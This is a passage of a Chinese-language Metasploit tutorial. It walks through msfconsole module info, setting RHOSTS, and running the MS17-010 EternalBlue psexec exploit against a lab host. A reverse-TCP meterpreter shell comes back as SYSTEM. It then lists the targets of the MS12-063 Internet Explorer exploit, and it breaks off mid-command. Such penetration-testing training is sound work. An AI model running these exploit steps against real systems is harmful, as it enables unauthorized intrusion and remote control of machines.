class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">     Module: exploit/windows/smb/ms17_010_psexec</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: x86, x64</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Normal</span><br><span class="line">  Disclosed: 2017-03-14</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  sleepya</span><br><span class="line">  zerosum0x0</span><br><span class="line">  Shadow Brokers</span><br><span class="line">  Equation Group</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic</span><br><span class="line">  1   PowerShell</span><br><span class="line">  2   Native upload</span><br><span class="line">  3   MOF upload</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name                  Current Setting                          Required  Description</span><br><span class="line">  ----                  ---------------                          --------  -----------</span><br><span class="line">  DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">  LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">  NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">  NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                        rdlists/named_pipes.txt</span><br><span class="line">  RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/</span><br><span class="line">                                                                           wiki/Using-Metasploit</span><br><span class="line">  RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">  SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">  SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">  SERVICE_NAME                                                   no        The service name</span><br><span class="line">  SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor</span><br><span class="line">                                                                           mal read/write folder share</span><br><span class="line">  SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">  SMBPass                                                        no        The password for the specified username</span><br><span class="line">  SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 3072</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module will exploit SMB with vulnerabilities in MS17-010 to </span><br><span class="line">  achieve a write-what-where primitive. This will then be used to </span><br><span class="line">  overwrite the connection session information with as an </span><br><span class="line">  Administrator session. From there, the normal psexec payload code </span><br><span class="line">  execution is done. Exploits a type confusion between Transaction and </span><br><span class="line">  WriteAndX requests and a race condition in Transaction requests, as </span><br><span class="line">  seen in the EternalRomance, EternalChampion, and EternalSynergy </span><br><span class="line">  exploits. This exploit chain is more reliable than the EternalBlue </span><br><span class="line">  exploit, but requires a named pipe.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2017-0143</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2017-0146</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2017-0147</span><br><span class="line">  https://github.com/worawit/MS17-010</span><br><span class="line">  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf</span><br><span class="line">  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/</span><br><span class="line"></span><br><span class="line">Also known as:</span><br><span class="line">  ETERNALSYNERGY</span><br><span class="line">  ETERNALROMANCE</span><br><span class="line">  ETERNALCHAMPION</span><br><span class="line">  ETERNALBLUE</span><br></pre></td></tr></table></figure>

<p>在我们对所选模块适合我们的目的感到满意之后，我们需要设置一些规范来自定义模块以成功地针对我们的目标主机使用它，例如设置目标（或<code>RHOST</code>）<code>RHOSTS</code>。</p>
<h4 id="MSF-目标规范"><a href="#MSF-目标规范" class="headerlink" title="MSF - 目标规范"></a>MSF - 目标规范</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.10.10.40</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 10.10.10.40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure>

<p>此外，还有一个选项<code>setg</code>，它指定我们选择的选项在程序重新启动之前是永久的。因此，如果我们在特定的目标主机上工作，我们可以使用此命令设置 IP 地址一次，并且在我们将焦点转移到不同的 IP 地址之前不再更改它。</p>
<h4 id="MSF-永久目标规范"><a href="#MSF-永久目标规范" class="headerlink" title="MSF - 永久目标规范"></a>MSF - 永久目标规范</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; setg RHOSTS 10.10.10.40</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 10.10.10.40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure>

<p>一旦一切就绪并准备就绪，我们就可以继续发起攻击。请注意，此处未设置有效载荷，因为默认的有效载荷足以进行此演示。</p>
<h4 id="MSF-利用执行"><a href="#MSF-利用执行" class="headerlink" title="MSF - 利用执行"></a>MSF - 利用执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.15:4444 </span><br><span class="line">[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.10.40:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.10.40:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.10.40:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.10.40:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.10.40:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.10.40:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.10.40:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.10.40:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Command shell session 1 opened (10.10.14.15:4444 -&gt; 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter&gt; shell</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<p>我们现在在目标机器上有一个 shell，我们可以与它交互。</p>
<h4 id="MSF-目标交互"><a href="#MSF-目标交互" class="headerlink" title="MSF - 目标交互"></a>MSF - 目标交互</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; whoami</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>

<p>这是一个如何<code>msfconsole</code>快速提供帮助的快速而肮脏的示例，但却是该框架如何工作的一个很好的示例。只需要一个模块，没有任何<code>payload</code>选择，<code>encoding</code>或者<code>pivoting</code>在会话或作业之间。</p>
<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p><code>Targets</code>是从那些特定操作系统的版本中获取的唯一操作系统标识符，这些操作系统使选定的漏洞利用模块可以在该特定版本的操作系统上运行。在漏洞利用模块视图中发出的命令<code>show targets</code>将显示该特定漏洞利用的所有可用漏洞目标，而在根菜单中发出相同的命令，在任何选定的漏洞利用模块之外，将让我们知道我们需要首先选择一个漏洞利用模块。</p>
<h4 id="MSF-显示目标"><a href="#MSF-显示目标" class="headerlink" title="MSF - 显示目标"></a>MSF - 显示目标</h4><p> MSF - 显示目标</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; show targets</span><br><span class="line"></span><br><span class="line">[-] No exploit module selected.</span><br></pre></td></tr></table></figure>

<p>当查看我们之前的漏洞利用模块时，这将是我们看到的：</p>
<p> MSF - 显示目标</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure>

<h3 id="选择目标"><a href="#选择目标" class="headerlink" title="选择目标"></a>选择目标</h3><p>我们可以看到这种类型的攻击只有一种通用类型的目标集。如果我们将漏洞利用模块更改为需要更具体目标范围的东西会怎样？以下漏洞利用的目的是：</p>
<ul>
<li><code>MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability</code>.</li>
</ul>
<p>如果我们想了解更多关于这个特定模块的信息以及它背后的漏洞是干什么的，我们可以使用命令<code>info</code>。当我们不确定不同漏洞利用或辅助模块的来源或功能时，此命令可以帮助我们。请记住，审核我们的代码以获取任何工件生成或“附加功能”始终被认为是最佳实践，该<code>info</code>命令应该是我们在使用新模块时采取的首要步骤之一。通过这种方式，我们可以熟悉漏洞利用功能，同时确保为我们的客户和我们提供安全、干净的工作环境。</p>
<h4 id="MSF-目标选择"><a href="#MSF-目标选择" class="headerlink" title="MSF - 目标选择"></a>MSF - 目标选择</h4><p> MSF - 目标选择</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability </span><br><span class="line">     Module: exploit/windows/browser/ie_execcommand_uaf</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Good</span><br><span class="line">  Disclosed: 2012-09-14</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  unknown</span><br><span class="line">  eromang</span><br><span class="line">  binjo</span><br><span class="line">  sinn3r &lt;sinn3r@metasploit.com&gt;</span><br><span class="line">  juan vazquez &lt;juan.vazquez@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic</span><br><span class="line">  1   IE 7 on Windows XP SP3</span><br><span class="line">  2   IE 8 on Windows XP SP3</span><br><span class="line">  3   IE 7 on Windows Vista</span><br><span class="line">  4   IE 8 on Windows Vista</span><br><span class="line">  5   IE 8 on Windows 7</span><br><span class="line">  6   IE 9 on Windows 7</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name       Current Setting  Required  Description</span><br><span class="line">  ----       ---------------  --------  -----------</span><br><span class="line">  OBFUSCATE  false            no        Enable JavaScript obfuscation</span><br><span class="line">  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">  SRVPORT    8080             yes       The local port to listen on.</span><br><span class="line">  SSL        false            no        Negotiate SSL for incoming connections</span><br><span class="line">  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">  URIPATH                     no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a vulnerability found in Microsoft Internet </span><br><span class="line">  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object </span><br><span class="line">  gets deleted in an unexpected manner, but the same memory is reused </span><br><span class="line">  again later in the CMshtmlEd::Exec() function, leading to a </span><br><span class="line">  use-after-free condition. Please note that this vulnerability has </span><br><span class="line">  been exploited since Sep 14, 2012. Also, note that </span><br><span class="line">  presently, this module has some target dependencies for the ROP </span><br><span class="line">  chain to be valid. For WinXP SP3 with IE8, msvcrt must be present </span><br><span class="line">  (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9, </span><br><span class="line">  JRE 1.6.x or below must be installed (which is often the case).</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2012-4969/</span><br><span class="line">  OSVDB (85532)</span><br><span class="line">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-063</span><br><span class="line">  http://technet.microsoft.com/en-us/security/advisory/2757760</span><br><span class="line">  http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/</span><br></pre></td></tr></table></figure>

<p>查看描述，我们可以大致了解此漏洞利用将为我们完成什么。牢记这一点，我们接下来要检查哪些版本容易受到此漏洞的攻击。</p>
<p> MSF - 目标选择</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/browser/ie_execcommand_uaf):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   OBFUSCATE  false            no        Enable JavaScript obfuscation</span><br><span class="line">   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT    8080             yes       The local port to listen on.</span><br><span class="line">   SSL        false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                     no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">   1   IE 7 on Windows XP SP3</span><br><span class="line">   2   IE 8 on Windows XP SP3</span><br><span class="line">   3   IE 7 on Windows Vista</span><br><span class="line">   4   IE 8 on Windows Vista</span><br><span class="line">   5   IE 8 on Windows 7</span><br><span class="line">   6   IE 9 on Windows 7</span><br></pre></td></tr></table></figure>

<p>我们看到了不同版本的 Internet Explorer 和各种 Windows 版本的选项。保留选择将<code>Automatic</code>让 msfconsole 知道它需要在发起成功攻击之前对给定目标执行服务检测。</p>
<p>但是，如果我们知道我们的目标上运行的是什么版本，我们可以使用该<code>set target &lt;index no.&gt;</code>命令从列表中选择一个目标。</p>
<p> MSF - 目标选择</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">   1   IE 7 on Windows XP SP3</span><br><span class="line">   2   IE 8 on Windows XP SP3</span><br><span class="line">   3   IE 7 on Windows Vista</span><br><span class="line">   4   IE 8 on Windows Vista</span><br><span class="line">   5   IE 8 on Windows 7</span><br><span class="line">   6   IE 9 on Windows 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; set target 6</span><br><span 